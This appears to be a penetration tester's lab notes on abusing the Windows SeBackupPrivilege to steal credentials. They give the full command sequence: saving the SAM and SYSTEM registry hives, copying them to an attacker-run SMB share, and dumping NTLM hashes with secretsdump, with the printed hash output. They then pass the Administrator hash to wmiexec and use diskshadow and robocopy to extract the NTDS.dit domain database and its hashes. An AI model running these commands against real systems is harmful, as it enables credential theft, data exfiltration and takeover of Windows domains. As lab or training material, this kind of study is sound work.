
If an user has the SeBackupPrivilege enabled or is part of the Backup Operators group we can retrieve the SYSTEM & SAM files from registry hives or even copy the whole drive and back it up into an different drive to access sensitive files like SYSTEM & SAM.
## Registry Hive PoC

```
reg save hklm\sam C:\Temp\SAM
```

```
reg save hklm\system C:\Temp\SYSTEM
```
##### Evil-WinRM

```
download SAM
```

```
download SYSTEM
```

##### Without Evil-WinRM

On local machine:

```
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

On target machine:

```
net use m: \\192.168.45.241\test /user:saitama saitama
```

Downloaded SAM file on local machine.

```
copy SAM m:\
```

Downloaded SYSTEM file on local machine.

```
copy SYSTEM m:\
```

Utilize secretsdump to dump hashes.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xb4999e49259682622dcc1e3a1636ff45
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:856f13362db36284f7d964120d794a98:::
enterpriseadmin:1001:aad3b435b51404eeaad3b435b51404ee:d94267c350fc02154f2aff04d384b354:::
diana:1002:aad3b435b51404eeaad3b435b51404ee:3f2e7dddbe7a42d8978c1689b67297f3:::
alex:1003:aad3b435b51404eeaad3b435b51404ee:821036ef8b6f43194779f6fca426f3f7:::
enterpriseuser:1004:aad3b435b51404eeaad3b435b51404ee:b875ee792421982ebcfa8217340ef376:::
offsec:1005:aad3b435b51404eeaad3b435b51404ee:d2ce08a1ee362158863d47d478b2622e:::
[*] Cleaning up...
```

Connected to Administrator with wmiexec.py

```
/usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5 Administrator@192.168.238.222
```

---
# Getting Domain Hashes

I need to get Domain Hashes. I can only get them by getting access to the so called NTDS.dit file. Since this file is getting used by the AD itself all the time, it can't be extracted.  We need to create a so called "shadow copy". The extraction o the domain hashes also requires the SYSTEM hive, which I already retrieved.

This template creates an snapshot or shadow copy of the C:\ Drive and exports it into an E:\ Drive. We can then view the NTDS.dit file in there and download it onto our local machine.

Saved this content into an script.txt file on the local machine.

```
set verbose on  
set metadata C:\Windows\Temp\test.cab  
set context persistent  
add volume C: alias cdrive  
create  
expose %cdrive% E:
```

Since Linux uses LF line endings and windows uses CRLF. We'll need to modify the script with another command in order to eliminate any errors.

```
unix2dos script.txt
```

We can now upload the script to the target.

```
upload script.txt
```

I then ran the windows in-built utility diskshadow.exe which allows me to create an copy of the C:\ Drive.

```
diskshadow /s script.txt
```

We can confirm if it worked.

```
dir E:\
```

To copy the NTDS.dit file we will utilize the windows in-built tool called "robocopy", because it is saver for big files.

```
robocopy /b E:\Windows\ntds . ntds.dit
```

This ensures that the Active Directory Database File is in our current Drive & Directory.

I then downloaded the file to my local machine.

```
download ntds.dit
```

Extracting SYSTEM hive out of the registry.

```
reg save hklm\system C:\Temp\SYSTEM
```

Downloading the hive onto my local machin.

```
download SYSTEM
```

Utilized secretsdump.py in order to dump all domain hashes.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit local
```
